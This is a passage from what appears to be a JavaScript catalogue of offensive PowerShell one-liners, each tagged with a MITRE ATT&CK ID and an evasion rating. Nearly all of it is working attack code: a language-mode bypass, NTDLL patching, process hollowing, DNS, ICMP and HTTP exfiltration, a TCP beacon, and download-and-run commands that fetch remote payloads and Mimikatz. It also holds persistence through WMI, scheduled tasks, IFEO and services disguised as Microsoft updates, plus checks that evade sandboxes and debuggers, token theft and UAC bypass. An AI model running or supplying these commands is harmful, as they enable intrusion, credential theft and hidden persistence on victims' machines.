    command: "$ExecutionContext.SessionState.LanguageMode='FullLanguage';[Environment]::SetEnvironmentVariable('__PSLockDownPolicy',$null,[EnvironmentVariableTarget]::Machine);$field=[System.Management.Automation.LanguagePrimitives].GetField('s_isTypeNameLoopInitialized','NonPublic,Static');$field.SetValue($null,$false);Write-Host 'Language mode restrictions removed'",
    description: "Multi-method constrained language mode bypass using environment variables and internal field manipulation.",
    complexity: "expert",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["evasion", "language mode", "constraints"],
    mitre_id: "T1562.001",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  reflective_loading: {
    command: "$bytes=[Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');$asm=[System.Reflection.Assembly]::Load($bytes);$type=$asm.GetType('ReflectiveDLL.Class1');$method=$type.GetMethod('Main');$instance=[Activator]::CreateInstance($type);$method.Invoke($instance,$null);Write-Host 'Reflective assembly loaded and executed'",
    description: "Advanced reflective assembly loading with type instantiation and method invocation for fileless execution.",
    complexity: "expert",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["memory", "reflective", "assembly", "fileless"],
    mitre_id: "T1055.001",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  obfuscated_invoke: {
    command: "$s1='I';$s2='E';$s3='X';$cmd=$s1+$s2+$s3;$w1='New-Object';$w2='Net.WebClient';$w3='DownloadString';$url='http://example.com/payload.ps1';$full=\"$cmd(($w1 $w2).$w3('$url'))\";$encoded=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($full));powershell -EncodedCommand $encoded",
    description: "Multi-layer string obfuscation with variable concatenation, encoding, and indirect execution.",
    complexity: "expert",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["obfuscation", "encoding", "variables", "indirect"],
    mitre_id: "T1027",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // Memory Manipulation (Expert Level)
  memory_patching: {
    command: "$code=@'[DllImport(\"kernel32.dll\")]public static extern bool VirtualProtect(IntPtr lpAddress,UIntPtr dwSize,uint flNewProtect,out uint lpfOldProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr GetProcAddress(IntPtr hModule,string procName);[DllImport(\"kernel32.dll\")]public static extern IntPtr LoadLibrary(string lpFileName);[DllImport(\"kernel32.dll\")]public static extern IntPtr GetModuleHandle(string lpModuleName);'@;Add-Type -MemberDefinition $code -Name MemPatch -Namespace Win32;$ntdll=[Win32.MemPatch]::GetModuleHandle('ntdll.dll');$addr=[Win32.MemPatch]::GetProcAddress($ntdll,'NtCreateThreadEx');$oldProtect=0;[Win32.MemPatch]::VirtualProtect($addr,5,0x40,[ref]$oldProtect);[System.Runtime.InteropServices.Marshal]::WriteByte($addr,0xC3);Write-Host 'NTDLL function patched'",
    description: "Advanced NTDLL function patching to bypass API monitoring by directly modifying function entry points.",
    complexity: "expert",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["memory", "patching", "ntdll", "api"],
    mitre_id: "T1055.001",
    detection_difficulty: "Very High",
    evasion_rating: 5,
    warning: "Modifies system DLL in memory"
  },
  syscall_direct: {
    command: "$code=@'[DllImport(\"ntdll.dll\")]public static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle,ref IntPtr BaseAddress,IntPtr ZeroBits,ref IntPtr RegionSize,uint AllocationType,uint Protect);[DllImport(\"ntdll.dll\")]public static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle,IntPtr BaseAddress,IntPtr Buffer,uint NumberOfBytesToWrite,ref uint NumberOfBytesWritten);[DllImport(\"ntdll.dll\")]public static extern uint NtCreateThreadEx(out IntPtr ThreadHandle,uint DesiredAccess,IntPtr ObjectAttributes,IntPtr ProcessHandle,IntPtr lpStartAddress,IntPtr lpParameter,bool CreateSuspended,uint StackZeroBits,uint SizeOfStackCommit,uint SizeOfStackReserve,IntPtr lpBytesBuffer);'@;Add-Type -MemberDefinition $code -Name DirectSyscall -Namespace Win32;$proc=[System.Diagnostics.Process]::GetCurrentProcess().Handle;$addr=[IntPtr]::Zero;$size=[IntPtr]0x1000;[Win32.DirectSyscall]::NtAllocateVirtualMemory($proc,[ref]$addr,[IntPtr]::Zero,[ref]$size,0x3000,0x40);Write-Host 'Direct syscall memory allocated'",
    description: "Advanced direct syscall implementation bypassing user-mode hooks through direct NTDLL function calls.",
    complexity: "expert",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["syscalls", "ntdll", "direct", "hooks"],
    mitre_id: "T1055",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  heaven_gate: {
    command: "$code=@'[DllImport(\"kernel32.dll\")]public static extern IntPtr GetCurrentProcess();[DllImport(\"kernel32.dll\")]public static extern bool IsWow64Process(IntPtr hProcess,out bool Wow64Process);[DllImport(\"kernel32.dll\")]public static extern IntPtr GetProcAddress(IntPtr hModule,string procName);[DllImport(\"kernel32.dll\")]public static extern IntPtr LoadLibrary(string lpFileName);'@;Add-Type -MemberDefinition $code -Name HeavenGate -Namespace Win32;$isWow64=$false;[Win32.HeavenGate]::IsWow64Process([Win32.HeavenGate]::GetCurrentProcess(),[ref]$isWow64);if($isWow64){$ntdll64=[Win32.HeavenGate]::LoadLibrary('C:\\Windows\\System32\\ntdll.dll');$proc64=[Win32.HeavenGate]::GetProcAddress($ntdll64,'NtQueryInformationProcess');Write-Host 'Heaven Gate transition ready - 64-bit NTDLL loaded in WoW64'}",
    description: "Advanced Heaven's Gate implementation for transitioning from 32-bit to 64-bit execution context in WoW64.",
    complexity: "expert",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["heaven gate", "wow64", "transition", "64bit"],
    mitre_id: "T1055",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  manual_dll_loading: {
    command: "$code=@'[DllImport(\"kernel32.dll\")]public static extern IntPtr LoadLibraryA(string lpLibFileName);[DllImport(\"kernel32.dll\")]public static extern IntPtr GetProcAddress(IntPtr hModule,string lpProcName);[DllImport(\"kernel32.dll\")]public static extern bool FreeLibrary(IntPtr hLibModule);[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress,uint dwSize,uint flAllocationType,uint flProtect);[DllImport(\"kernel32.dll\")]public static extern bool VirtualProtect(IntPtr lpAddress,uint dwSize,uint flNewProtect,out uint lpflOldProtect);'@;Add-Type -MemberDefinition $code -Name ManualLoader -Namespace Win32;$lib=[Win32.ManualLoader]::LoadLibraryA('ntdll.dll');$func=[Win32.ManualLoader]::GetProcAddress($lib,'NtAllocateVirtualMemory');$mem=[Win32.ManualLoader]::VirtualAlloc([IntPtr]::Zero,0x1000,0x3000,0x40);Write-Host 'Manual DLL loading with memory allocation completed'",
    description: "Advanced manual DLL loading with memory allocation and function resolution to avoid import table detection.",
    complexity: "expert",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["dll", "manual", "loading", "memory"],
    mitre_id: "T1055.001",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  process_hollowing: {
    command: "$code=@'[DllImport(\"kernel32.dll\")]public static extern IntPtr OpenProcess(uint dwDesiredAccess,bool bInheritHandle,uint dwProcessId);[DllImport(\"kernel32.dll\")]public static extern bool VirtualProtectEx(IntPtr hProcess,IntPtr lpAddress,uint dwSize,uint flNewProtect,out uint lpflOldProtect);[DllImport(\"kernel32.dll\")]public static extern bool WriteProcessMemory(IntPtr hProcess,IntPtr lpBaseAddress,byte[] lpBuffer,uint nSize,out uint lpNumberOfBytesWritten);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateRemoteThread(IntPtr hProcess,IntPtr lpThreadAttributes,uint dwStackSize,IntPtr lpStartAddress,IntPtr lpParameter,uint dwCreationFlags,IntPtr lpThreadId);[DllImport(\"ntdll.dll\")]public static extern uint NtUnmapViewOfSection(IntPtr ProcessHandle,IntPtr BaseAddress);'@;Add-Type -MemberDefinition $code -Name ProcessHollow -Namespace Win32;$notepad=Start-Process notepad -WindowStyle Hidden -PassThru;$handle=[Win32.ProcessHollow]::OpenProcess(0x1F0FFF,$false,$notepad.Id);Write-Host 'Process hollowing target created and opened'",
    description: "Advanced process hollowing with target process creation and memory unmapping for malicious code injection.",
    complexity: "expert",
    platform: "windows",
    category: "Process Injection",
    author: "0x0806",
    tags: ["process", "hollowing", "injection", "unmapping"],
    mitre_id: "T1055.012",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // Network & Covert Channels
  dns_tunneling: {
    command: "$data=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Process|Select -First 5|ConvertTo-Json -Compress)));$chunks=$data -split '(.{60})' | Where{$_};$domain='tunnel.example.com';foreach($chunk in $chunks){$query=\"$([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($chunk))).$domain\";try{$result=Resolve-DnsName $query -Type TXT -EA SilentlyContinue;if($result){Write-Host \"Response: $($result.Strings)\"}}catch{};Start-Sleep 1};Write-Host 'DNS tunneling completed'",
    description: "Advanced DNS tunneling with Base64 encoding, chunking, and TXT record responses for bidirectional communication.",
    complexity: "expert",
    platform: "windows",
    category: "Exfiltration Over Alternative Protocol",
    author: "0x0806",
    tags: ["dns", "tunneling", "exfiltration", "txt"],
    mitre_id: "T1048.003",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  icmp_tunnel: {
    command: "$data=[Text.Encoding]::UTF8.GetBytes((Get-ComputerInfo|Select WindowsProductName,TotalPhysicalMemory|ConvertTo-Json -Compress));$chunks=for($i=0;$i -lt $data.Length;$i+=32){$data[$i..[Math]::Min($i+31,$data.Length-1)]};$ping=New-Object System.Net.NetworkInformation.Ping;foreach($chunk in $chunks){$options=New-Object System.Net.NetworkInformation.PingOptions;$options.DontFragment=$true;$reply=$ping.Send('8.8.8.8',5000,$chunk,$options);Write-Host \"ICMP sent: $($chunk.Length) bytes, Status: $($reply.Status)\";Start-Sleep 1};Write-Host 'ICMP tunneling completed'",
    description: "Advanced ICMP tunneling with data chunking, fragment control, and status monitoring for covert exfiltration.",
    complexity: "expert",
    platform: "windows",
    category: "Exfiltration Over Alternative Protocol",
    author: "0x0806",
    tags: ["icmp", "tunneling", "chunking", "fragments"],
    mitre_id: "T1048.003",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  tcp_beacon: {
    command: "$client=New-Object System.Net.Sockets.TcpClient;$endpoint=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Parse('192.168.1.100'),4444);try{$client.Connect($endpoint);$stream=$client.GetStream();$writer=New-Object System.IO.StreamWriter($stream);$reader=New-Object System.IO.StreamReader($stream);$beacon=@{hostname=$env:COMPUTERNAME;user=$env:USERNAME;time=(Get-Date).ToString();data=(Get-Process|Select -First 3|ConvertTo-Json -Compress)};$writer.WriteLine(($beacon|ConvertTo-Json -Compress));$writer.Flush();$response=$reader.ReadLine();Write-Host \"Received: $response\"}catch{Write-Host 'Connection failed'}finally{$client.Close()};Write-Host 'TCP beacon completed'",
    description: "Advanced TCP beacon with JSON payload formatting, bidirectional communication, and error handling.",
    complexity: "expert",
    platform: "windows",
    category: "Application Layer Protocol",
    author: "0x0806",
    tags: ["tcp", "beacon", "json", "bidirectional"],
    mitre_id: "T1071.001",
    detection_difficulty: "High",
    evasion_rating: 4
  },
  http_tunnel: {
    command: "$headers=@{'User-Agent'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36';'Accept'='text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';'Accept-Language'='en-US,en;q=0.5';'Connection'='keep-alive'};$data=@{hostname=$env:COMPUTERNAME;domain=$env:USERDOMAIN;user=$env:USERNAME;arch=$env:PROCESSOR_ARCHITECTURE;processes=(Get-Process|Select -First 5 Name,Id|ConvertTo-Json -Compress)};$body=$data|ConvertTo-Json -Compress;$response=Invoke-WebRequest -Uri 'https://httpbin.org/post' -Method POST -Body $body -Headers $headers -ContentType 'application/json' -UseBasicParsing;Write-Host \"Response: $($response.StatusCode)\";Write-Host 'HTTP tunnel completed'",
    description: "Advanced HTTP tunneling with realistic browser headers, JSON payload, and comprehensive system data exfiltration.",
    complexity: "expert",
    platform: "windows",
    category: "Exfiltration Over Web Service",
    author: "0x0806",
    tags: ["http", "tunnel", "headers", "json"],
    mitre_id: "T1567.002",
    detection_difficulty: "High",
    evasion_rating: 4
  },

  // Advanced Persistence
  wmi_backdoor: {
    command: "$filterName='WindowsUpdateFilter';$consumerName='WindowsUpdateConsumer';$query=\"SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2\";$action='powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(`\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1`\")\"';try{Register-WmiEvent -Query $query -Action ([ScriptBlock]::Create($action)) -SourceIdentifier $filterName;$filter=Set-WmiInstance -Class __EventFilter -NameSpace \"root\\subscription\" -Arguments @{Name=$filterName;EventNameSpace=\"root\\cimv2\";QueryLanguage=\"WQL\";Query=$query};$consumer=Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\\subscription\" -Arguments @{Name=$consumerName;CommandLineTemplate=$action};$binding=Set-WmiInstance -Class __FilterToConsumerBinding -Namespace \"root\\subscription\" -Arguments @{Filter=$filter;Consumer=$consumer};Write-Host 'WMI backdoor installed'}catch{Write-Host 'WMI backdoor failed'}",
    description: "Advanced WMI event subscription backdoor with persistent filter-consumer binding for stealth execution.",
    complexity: "expert",
    platform: "windows",
    category: "Event Triggered Execution",
    author: "0x0806",
    tags: ["wmi", "persistence", "events", "binding"],
    mitre_id: "T1546.003",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  scheduled_task_stealth: {
    command: "$taskName='MicrosoftEdgeUpdateTaskMachine';$action=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString(`\"https://pastebin.com/raw/payload123`\")\"';$trigger=New-ScheduledTaskTrigger -AtLogOn;$settings=New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0 -MultipleInstances IgnoreNew -RestartOnIdle;$principal=New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest;try{Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Description 'Microsoft Edge Update Task for machine-wide installation';Write-Host 'Stealth scheduled task created'}catch{Write-Host 'Task creation failed'}",
    description: "Advanced stealth scheduled task disguised as legitimate Microsoft Edge update with system privileges.",
    complexity: "expert",
    platform: "windows",
    category: "Scheduled Task/Job",
    author: "0x0806",
    tags: ["scheduled task", "stealth", "disguise", "system"],
    mitre_id: "T1053.005",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  image_file_execution: {
    command: "$target='notepad.exe';$debugger='powershell.exe -WindowStyle Hidden -NoProfile -Command \"Start-Process cmd.exe -ArgumentList `/c,`\"echo IFEO activated && timeout /t 5`\" -WindowStyle Hidden; IEX (New-Object Net.WebClient).DownloadString(`\"https://pastebin.com/raw/payload123`\")\"';$regPath=\"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$target\";try{New-Item -Path $regPath -Force | Out-Null;New-ItemProperty -Path $regPath -Name 'Debugger' -Value $debugger -PropertyType String -Force | Out-Null;New-ItemProperty -Path $regPath -Name 'GlobalFlag' -Value 0x200 -PropertyType DWord -Force | Out-Null;Write-Host \"IFEO persistence installed for $target\"}catch{Write-Host 'IFEO installation failed'}",
    description: "Advanced Image File Execution Options hijacking with global flags and stealth PowerShell execution.",
    complexity: "expert",
    platform: "windows",
    category: "Image File Execution Options Injection",
    author: "0x0806",
    tags: ["ifeo", "hijacking", "global flags", "stealth"],
    mitre_id: "T1546.012",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  service_persistence: {
    command: "$serviceName='WindowsDefenderUpdateService';$serviceDesc='Provides real-time protection against malware by checking for updates to Windows Defender definitions';$binaryPath='C:\\Windows\\System32\\svchost.exe -k DefenderGroup';$serviceDll='C:\\Windows\\System32\\defender_update.dll';$regPath=\"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$serviceName\\Parameters\";try{New-Service -Name $serviceName -BinaryPathName $binaryPath -DisplayName 'Windows Defender Update Service' -Description $serviceDesc -StartupType Automatic | Out-Null;New-Item -Path $regPath -Force | Out-Null;New-ItemProperty -Path $regPath -Name 'ServiceDll' -Value $serviceDll -PropertyType String | Out-Null;Write-Host 'Service persistence installed'}catch{Write-Host 'Service installation failed'}",
    description: "Advanced service persistence using legitimate svchost.exe with DLL hijacking for stealthy execution.",
    complexity: "expert",
    platform: "windows",
    category: "Create or Modify System Process",
    author: "0x0806",
    tags: ["service", "svchost", "dll hijacking", "stealth"],
    mitre_id: "T1543.003",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // Anti-Analysis & Sandbox Evasion
  timing_evasion: {
    command: "$iterations=10;$delays=@();for($i=0;$i -lt $iterations;$i++){$start=Get-Date;Start-Sleep -Milliseconds 100;$end=Get-Date;$delays+=($end-$start).TotalMilliseconds};$avgDelay=$delays | Measure-Object -Average | Select -ExpandProperty Average;if($avgDelay -gt 200){Write-Host 'Sandbox detected - excessive timing delay';exit}else{$start=Get-Date;Start-Sleep -Seconds 120;$end=Get-Date;$elapsed=($end-$start).TotalSeconds;if($elapsed -lt 115){Write-Host 'Time acceleration detected - sandbox environment';exit}else{Write-Host 'Timing checks passed - proceeding'}}",
    description: "Advanced timing-based sandbox evasion using multiple delay measurements and time acceleration detection.",
    complexity: "expert",
    platform: "windows",
    category: "Virtualization/Sandbox Evasion",
    author: "0x0806",
    tags: ["timing", "sandbox", "acceleration", "measurement"],
    mitre_id: "T1497.003",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  mouse_movement: {
    command: "Add-Type -AssemblyName System.Windows.Forms;$initialPos=[System.Windows.Forms.Cursor]::Position;$positions=@();for($i=0;$i -lt 30;$i++){Start-Sleep -Seconds 1;$currentPos=[System.Windows.Forms.Cursor]::Position;$positions+=$currentPos};$movements=$positions|Group-Object|Measure-Object|Select -ExpandProperty Count;$uniquePositions=($positions|Sort-Object|Get-Unique).Count;if($uniquePositions -lt 3 -or $movements -lt 5){Write-Host 'Insufficient mouse movement - sandbox detected';exit}else{Write-Host 'Human interaction confirmed - proceeding'}",
    description: "Advanced mouse movement analysis with position tracking, uniqueness validation, and pattern detection.",
    complexity: "expert",
    platform: "windows",
    category: "Virtualization/Sandbox Evasion",
    author: "0x0806",
    tags: ["mouse", "interaction", "tracking", "patterns"],
    mitre_id: "T1497.002",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  vm_detection: {
    command: "$vmIndicators=@{Manufacturers=@('VMware','VirtualBox','Microsoft Corporation','QEMU','Xen','Parallels');Models=@('VMware Virtual Platform','VirtualBox','Virtual Machine','RHEV Hypervisor','Bochs','KVM');BIOSes=@('Phoenix Technologies LTD','Award Software','SeaBIOS')};$system=Get-CimInstance Win32_ComputerSystem;$bios=Get-CimInstance Win32_BIOS;$cpu=Get-CimInstance Win32_Processor;$vmDetected=$false;foreach($mfg in $vmIndicators.Manufacturers){if($system.Manufacturer -like \"*$mfg*\"){$vmDetected=$true;break}};foreach($model in $vmIndicators.Models){if($system.Model -like \"*$model*\"){$vmDetected=$true;break}};if($cpu.Name -like '*Virtual*' -or $cpu.Description -like '*Virtual*'){$vmDetected=$true};if($vmDetected){Write-Host 'Virtual machine detected - exiting';exit}else{Write-Host 'Physical machine confirmed'}",
    description: "Comprehensive virtual machine detection using manufacturer, model, BIOS, and CPU analysis.",
    complexity: "expert",
    platform: "windows",
    category: "Virtualization/Sandbox Evasion",
    author: "0x0806",
    tags: ["vm", "detection", "hardware", "comprehensive"],
    mitre_id: "T1497.001",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  debugger_detection: {
    command: "$debuggerChecks=@{};$debuggerChecks.Attached=[System.Diagnostics.Debugger]::IsAttached;$debuggerChecks.Logging=[System.Diagnostics.Debugger]::IsLogging();$parentPID=(Get-WmiObject Win32_Process -Filter \"ProcessId=$PID\").ParentProcessId;$parentProc=Get-Process -Id $parentPID -EA SilentlyContinue;$debuggerChecks.ParentName=$parentProc.ProcessName;$debuggerProcs=@('windbg','x64dbg','x32dbg','ollydbg','ida','ida64','ghidra','cheatengine','processhacker','wireshark','fiddler');$runningDebuggers=Get-Process|Where{$_.ProcessName -in $debuggerProcs}|Select ProcessName;$debuggerChecks.RunningDebuggers=$runningDebuggers;if($debuggerChecks.Attached -or $debuggerChecks.Logging -or $debuggerChecks.ParentName -in $debuggerProcs -or $runningDebuggers){Write-Host 'Debugger detected - analysis environment identified';exit}else{Write-Host 'No debugger detected'}",
    description: "Advanced debugger detection using multiple methods including attachment, logging, parent process, and running process analysis.",
    complexity: "expert",
    platform: "windows",
    category: "Debugger Evasion",
    author: "0x0806",
    tags: ["debugger", "detection", "analysis", "comprehensive"],
    mitre_id: "T1497.001",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // Encryption & Obfuscation
  chacha20_encryption: {
    command: "$key=[System.Security.Cryptography.RandomNumberGenerator]::GetBytes(32);$nonce=[System.Security.Cryptography.RandomNumberGenerator]::GetBytes(12);$plaintext=[System.Text.Encoding]::UTF8.GetBytes('Get-Process|Sort CPU -Desc|Select -First 10');try{Add-Type -AssemblyName System.Security.Cryptography;$chacha=[System.Security.Cryptography.ChaCha20Poly1305]::new($key);$ciphertext=$chacha.Encrypt($nonce,$plaintext,$null);$encoded=[Convert]::ToBase64String($ciphertext);$keyB64=[Convert]::ToBase64String($key);$nonceB64=[Convert]::ToBase64String($nonce);Write-Host \"Encrypted: $encoded\";Write-Host \"Key: $keyB64\";Write-Host \"Nonce: $nonceB64\"}catch{Write-Host 'ChaCha20 not available - using AES fallback';$aes=[System.Security.Cryptography.Aes]::Create();$aes.Key=$key[0..31];$aes.IV=$key[0..15];$encrypted=$aes.CreateEncryptor().TransformFinalBlock($plaintext,0,$plaintext.Length);Write-Host \"AES Encrypted: $([Convert]::ToBase64String($encrypted))\"}",
    description: "Advanced encryption using ChaCha20-Poly1305 with AES fallback for secure payload obfuscation.",
    complexity: "expert",
    platform: "windows",
    category: "Data Obfuscation",
    author: "0x0806",
    tags: ["encryption", "chacha20", "aes", "fallback"],
    mitre_id: "T1027",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  polymorphic_shellcode: {
    command: "$shellcode=@(0x48,0x31,0xc0,0x48,0x31,0xdb,0x48,0x31,0xc9,0x48,0x31,0xd2);$key=Get-Random -Maximum 256;$nop=Get-Random -Minimum 0x90 -Maximum 0x95;$encrypted=$shellcode|ForEach{$_ -bxor $key};$decryptor=@();for($i=0;$i -lt (Get-Random -Minimum 5 -Maximum 15);$i++){$decryptor+=$nop};$decryptor+=@(0x48,0xC7,0xC0)+[BitConverter]::GetBytes($key)[0..3];$decryptor+=@(0x48,0xC7,0xC1)+[BitConverter]::GetBytes($shellcode.Length)[0..3];$polymorphic=$decryptor+$encrypted;$encoded=[Convert]::ToBase64String($polymorphic);Write-Host \"Polymorphic shellcode: $encoded\";Write-Host \"Decryption key: $key\";Write-Host \"NOP sled instruction: 0x$($nop.ToString('X2'))\"",
    description: "Advanced polymorphic shellcode generator with random NOP sleds, XOR encryption, and dynamic decryptor.",
    complexity: "expert",
    platform: "windows",
    category: "Data Obfuscation",
    author: "0x0806",
    tags: ["polymorphic", "shellcode", "nop", "dynamic"],
    mitre_id: "T1027.002",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  string_encryption: {
    command: "$strings=@('powershell.exe','IEX','New-Object','Net.WebClient','DownloadString');$encrypted=@{};foreach($str in $strings){$key=[System.Text.Encoding]::UTF8.GetBytes((Get-Random).ToString().Substring(0,16).PadRight(16,'0'));$plainBytes=[System.Text.Encoding]::UTF8.GetBytes($str);$aes=[System.Security.Cryptography.Aes]::Create();$aes.Key=$key;$aes.GenerateIV();$encryptor=$aes.CreateEncryptor();$encryptedBytes=$encryptor.TransformFinalBlock($plainBytes,0,$plainBytes.Length);$encrypted[$str]=@{Data=[Convert]::ToBase64String($encryptedBytes);Key=[Convert]::ToBase64String($key);IV=[Convert]::ToBase64String($aes.IV)}};$encrypted|ConvertTo-Json -Depth 3",
    description: "Advanced string encryption system using AES with random keys and IVs for comprehensive obfuscation.",
    complexity: "expert",
    platform: "windows",
    category: "Data Obfuscation",
    author: "0x0806",
    tags: ["string", "encryption", "aes", "random"],
    mitre_id: "T1027",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // Privilege Escalation
  uac_bypass: {
    command: "$tempDir=\"$env:temp\\$(Get-Random)\";New-Item -Path $tempDir -ItemType Directory -Force|Out-Null;$dllPath=\"$tempDir\\wusa.dll\";$exploitDll=@'using System;using System.Runtime.InteropServices;public class Program{[DllImport(\"kernel32.dll\")]static extern IntPtr GetCurrentProcess();[DllImport(\"advapi32.dll\")]static extern bool OpenProcessToken(IntPtr ProcessHandle,uint DesiredAccess,out IntPtr TokenHandle);[DllImport(\"advapi32.dll\")]static extern bool GetTokenInformation(IntPtr TokenHandle,int TokenInformationClass,IntPtr TokenInformation,uint TokenInformationLength,out uint ReturnLength);public static void Main(){IntPtr hToken;OpenProcessToken(GetCurrentProcess(),0x0008,out hToken);uint tokenInfoLength=0;GetTokenInformation(hToken,20,IntPtr.Zero,tokenInfoLength,out tokenInfoLength);Console.WriteLine(\"UAC bypass attempt\");}}'@;Add-Type -TypeDefinition $exploitDll -OutputAssembly $dllPath;wusa.exe /quiet /extract:$tempDir;Remove-Item $tempDir -Recurse -Force -EA SilentlyContinue",
    description: "Advanced UAC bypass using Windows Update Standalone Installer (WUSA) with DLL extraction and token manipulation.",
    complexity: "expert",
    platform: "windows",
    category: "Privilege Escalation",
    author: "0x0806",
    tags: ["uac", "bypass", "wusa", "token"],
    mitre_id: "T1548.002",
    detection_difficulty: "Very High",
    evasion_rating: 5,
    warning: "May trigger UAC-related security monitoring"
  },
  token_manipulation: {
    command: "$code=@'[DllImport(\"advapi32.dll\")]public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);[DllImport(\"advapi32.dll\")]public static extern bool OpenProcessToken(IntPtr ProcessHandle,uint DesiredAccess,out IntPtr TokenHandle);[DllImport(\"advapi32.dll\")]public static extern bool DuplicateToken(IntPtr ExistingTokenHandle,int ImpersonationLevel,out IntPtr DuplicateTokenHandle);[DllImport(\"kernel32.dll\")]public static extern IntPtr OpenProcess(uint dwDesiredAccess,bool bInheritHandle,uint dwProcessId);[DllImport(\"advapi32.dll\")]public static extern bool RevertToSelf();'@;Add-Type -MemberDefinition $code -Name TokenManip -Namespace Win32;$winlogon=Get-Process winlogon|Select -First 1;$hProcess=[Win32.TokenManip]::OpenProcess(0x400,$false,$winlogon.Id);$hToken=[IntPtr]::Zero;[Win32.TokenManip]::OpenProcessToken($hProcess,0x2,[ref]$hToken);$hDupeToken=[IntPtr]::Zero;[Win32.TokenManip]::DuplicateToken($hToken,2,[ref]$hDupeToken);[Win32.TokenManip]::ImpersonateLoggedOnUser($hDupeToken);Write-Host 'Token manipulation completed'",
    description: "Advanced token manipulation for privilege escalation by duplicating and impersonating system tokens.",
    complexity: "expert",
    platform: "windows",
    category: "Access Token Manipulation",
    author: "0x0806",
    tags: ["token", "impersonation", "duplicate", "system"],
    mitre_id: "T1134.001",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  service_escalation: {
    command: "$services=Get-WmiObject Win32_Service|Where{$_.PathName -match '\".*\\s.*\"' -and $_.PathName -notmatch '^\"%SystemRoot%' -and $_.PathName -notmatch '^\"C:\\\\Windows'}|Select Name,PathName,StartMode,State;foreach($svc in $services){$path=$svc.PathName -replace '\"','';$dir=Split-Path $path -Parent;$acl=Get-Acl $dir -EA SilentlyContinue;if($acl.Access|Where{$_.IdentityReference -match 'Users' -and $_.FileSystemRights -match 'Write'}){Write-Host \"Vulnerable service: $($svc.Name) - $path\";$payload='cmd.exe /c powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(\\\"https://pastebin.com/raw/payload123\\\")\"';$payload|Out-File \"$dir\\malicious.exe\" -Encoding ASCII}}",
    description: "Advanced service escalation through unquoted service path vulnerabilities with automated exploitation.",
    complexity: "expert",
    platform: "windows",
    category: "Hijack Execution Flow",
    author: "0x0806",
    tags: ["service", "unquoted", "path", "escalation"],
    mitre_id: "T1574.009",
    detection_difficulty: "High",
    evasion_rating: 4
  },
  dll_hijacking: {
    command: "$vulnerableDlls=@('version.dll','dwmapi.dll','uxtheme.dll','winmm.dll','wtsapi32.dll');$targetPaths=@('C:\\Windows\\System32','C:\\Windows\\SysWOW64','C:\\Program Files','C:\\Program Files (x86)');foreach($dll in $vulnerableDlls){foreach($path in $targetPaths){$fullPath=\"$path\\$dll\";if(!(Test-Path $fullPath)){$maliciousDll=@'#include <windows.h>BOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved){switch(ul_reason_for_call){case DLL_PROCESS_ATTACH:system(\"powershell.exe -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString(\\\"https://pastebin.com/raw/payload123\\\")\");break;}return TRUE;}'@;Write-Host \"Potential DLL hijacking opportunity: $fullPath\"}}}",
    description: "Advanced DLL hijacking detection and exploitation framework for privilege escalation.",
    complexity: "expert",
